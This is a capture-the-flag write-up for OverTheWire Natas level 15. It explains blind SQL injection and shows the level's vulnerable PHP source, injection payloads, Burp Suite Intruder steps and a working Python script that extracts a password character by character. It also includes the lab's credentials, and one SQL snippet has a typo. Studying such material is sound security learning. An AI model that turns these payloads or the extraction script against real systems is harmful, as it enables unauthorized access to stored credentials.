+++
title = "Level 15"
date = 2025-03-27T14:45:00+01:00
tags = ["cybersecurity", "hacking"]
draft = false
+++

-   State "DONE"       from              <span class="timestamp-wrapper"><span class="timestamp">[2025-03-27 Thu 14:45]</span></span>

<http://natas15.natas.labs.overthewire.org/>

This level starts very similar to level 14, however no we only check for the existence of a user using an input field:

{{< figure src="/ox-hugo/clipboard-20250319T130841.png" >}}

Entering `natas16` lets us know that this user exists. However, when we look at the sourcecode we see that we have a problem here:

```web
  <html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas15", "pass": "<censored>" };</script></head>
<body>
<h1>natas15</h1>
<div id="content">
<?php

/*
CREATE TABLE `users` (
  `username` varchar(64) DEFAULT NULL,
  `password` varchar(64) DEFAULT NULL
);
*/

if(array_key_exists("username", $_REQUEST)) {
    $link = mysqli_connect('localhost', 'natas15', '<censored>');
    mysqli_select_db($link, 'natas15');

    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    $res = mysqli_query($link, $query);
    if($res) {
    if(mysqli_num_rows($res) > 0) {
        echo "This user exists.<br>";
    } else {
        echo "This user doesn't exist.<br>";
    }
    } else {
        echo "Error in query.<br>";
    }

    mysqli_close($link);
} else {
?>

<form action="index.php" method="POST">
Username: <input name="username"><br>
<input type="submit" value="Check existence" />
</form>
<?php } ?>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

So the logical flow is as follows:

-   Check if an input for username is given, if so connect to the database using natas15 and a censored password
-   Then there is some logic checking if the username is in the database. As before the SQL input is unsanitized and allows for SQL injection
-   However, there is a major problem here: the code does not contain any functions to display the actual result of the SQL query.

So, we do not have any way - using this sourcecode - to directly show the password for the user natas16. This means we need to think outside the box.


## Background: Blind SQL injection {#background-blind-sql-injection}

The way forward leads through something called "blind SQL injection". Here is what owasp has to say about blind SQL injection:

> Blind SQL (Structured Query Language) injection is a type of SQL Injection attack that asks the database true or false questions and determines the answer based on the applications response. This attack is often used when the web application is configured to show generic error messages, but has not mitigated the code that is vulnerable to SQL injection.
>
> When an attacker exploits SQL injection, sometimes the web application displays error messages from the database complaining that the SQL Query’s syntax is incorrect. Blind SQL injection is nearly identical to normal SQL Injection, the only difference being the way the data is retrieved from the database. When the database does not output data to the web page, an attacker is forced to steal data by asking the database a series of true or false questions. This makes exploiting the SQL Injection vulnerability more difficult, but not impossible.

An example:

```html
http://newspaper.com/items.php?id=2
```

sends the following query to the database:

```sql
SELECT title, description, body FROM items WHERE ID = 2
```

The attacker may then try to inject a query that returns 'false':

```html
http://newspaper.com/items.php?id=2 and 1=2
```

This makes the SQL query something like this:

```sql
SELECT title, description, body FROM items WHERE ID = 2 and 1=2
```

If the web app is vulnerable to SQL injection, it will probably not return anything. To make sure we can inject a query that wil return `TRUE`:

```html
http://newspaper.com/items.php?id=2 and 1=1
```

If the content of the page that returns `TRUE` is different than that of the page that returns `FALSE` then the attacker is able to distinguish when the executed query returns true or false

So recap:

-   In blind SQL injection we first use a known true statement vs. a known false statement to determine if there are different answers from the server for both.
-   If there are we can use this to our advantage
-


### Time-based injection {#time-based-injection}

TODO


## Using blind SQL injection to solve level 15 {#using-blind-sql-injection-to-solve-level-15}

So how can we use this to our advantage to solve this level? Let's think about what we know and what we want:

-   We know that the user with the username 'natas16' exists because of the structure of the challenges for 'natas' and because we have tried in the form.
-   We know there is usually a password associated that is 32 alphanumerical characters long.

So what we need to do is create a query that looks something like this:

```sql
SELECT * from users where username="" and substring(password,1,32)='32charpassword';
```

But: we do not know the 32 characters of the password. However, what do we know? We know that if attack with a SQL injection that gives us back a result/prints a row, the website gives us back a different reply than in the case of a faulty SQL query. How can we use this to our advantage?

Think about the following query:

```sql
SELECT * from users where username="" and substring(password,1,1)='a';
```

If the first letter of the password is 'a', we will get back a 'positive' result, i.e. a response containing the Text "This entry exists". If not, we will get back a different result. So we need a way to test all alphanumerical characters in the query above. We can obviously do this manually, but considering the password has 32 letters, this would be madness. Instead, we have two options: using burpsuite or a custom script.


### Blind SQL injection with burpsuite {#blind-sql-injection-with-burpsuite}

As before, open burpsuite, open the included browser, go to the natas15 page and set intercept to "on". Then insert the SQL query snippet ~" OR substring(password,1,1) = "a" -- ~ (do not forget the space at the end or your query will not work) and click the button.

{{< figure src="/ox-hugo/clipboard-20250321T110819.png" >}}

Then move to burpsuite Proxy and forward the intercepted request to the Intruder. Here, set the "debug" bit and then mark the payload you want to manipulate - in our case the a in the query and click `Add §`. This opens the payloads window, select `Brute Forcer` and reduce the min/max length to 1 (we want only 1 character at this point, bc. the free version of burpsuite is throttled, anything else would take forever).

{{< figure src="/ox-hugo/clipboard-20250321T120612.png" >}}

This opens a window where we see the results of our attack. We can see that for every letter we get one response back. If you look at the "length column", you can see that one response seems to be of different length than the others implying that this might be our candidate. And indeed - if we click this and look at the resposne we can see that we are told "This user exists". This means "h" is most likely the first letter of our password.

{{< figure src="/ox-hugo/clipboard-20250321T120549.png" >}}

We can then move on to the next letter by using this query, which gives us the letter "p":

```sql
" OR substring(password,1,2) = "ha" --
```

This would work, but is also quite unwieldy, especially with longer passwords and a throttled burpsuite version. Instead of using burpsuite, we can also use a python script to do this task.


### Blind SQL injection with python {#blind-sql-injection-with-python}

We can make our SQL injection a bit more precise: We already know that the user is natas16, so we can input this user and look for its password in order to avoid mistakes:

```sql
natas16" AND BINARY substring(password,1,1="a" --
```

This gives us the following script:

```python
import requests
import string

url = "http://natas15.natas.labs.overthewire.org/index.php"
auth = ("natas15", "SdqIqBsFcz3yotlNYErZSZwblkm0lrvx")
charset = string.ascii_lowercase + string.ascii_uppercase + string.digits
found_password = ""
while True:
    found_char = None
    for char in charset:
        payload = f'natas16" AND BINARY substring(password,1,{len(found_password)+1})="{found_password + char}" -- '
        response = requests.post(url, auth=auth, data={"username": payload})
        if "This user exists" in response.text:
            found_password += char
            print(f"[+] Found password so far: {found_password}")
            found_char = char
            break

    if not found_char:
        break  # Stop if no new characters are found

print(f"[+] Extracted password: {found_password}")
```

And here we see the script in action:

{{< figure src="/ox-hugo/clipboard-20250322T115551.png" >}}

-   And our password is: hPkjKYviLQctEW33QmuXL6eDVfMW4sGo
-


## Security implications {#security-implications}

-   Even when you do not give back text as output, you might be giving things away when allowing for SQL injection.
-   Sanitize your user input!
